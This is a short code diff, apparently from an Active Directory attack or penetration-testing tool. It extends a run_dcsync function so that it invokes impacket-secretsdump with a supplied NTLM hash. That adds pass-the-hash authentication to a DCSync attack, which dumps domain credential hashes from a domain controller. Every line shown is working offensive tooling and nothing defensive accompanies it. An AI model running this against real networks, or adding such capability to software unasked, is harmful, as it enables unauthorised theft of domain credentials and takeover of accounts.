@@ -21,10 +21,13 @@ CONTROL_ACCESS = 0x00000100
 GENERIC_ALL = 0x10000000
 
 
-def run_dcsync(domain, username, password, target, *, no_pass=False):
+def run_dcsync(domain, username, password, target, *, no_pass=False, ntlm_hash=None):
     if no_pass:
         credential = f"{domain}/{username}@{target}"
         command = ["impacket-secretsdump", "-no-pass", credential]
+    elif ntlm_hash:
+        credential = f"{domain}/{username}@{target}"
+        command = ["impacket-secretsdump", "-hashes", f":{ntlm_hash}", credential]
     else:
         credential = f"{domain}/{username}:{password}@{target}"
         command = ["impacket-secretsdump", credential]
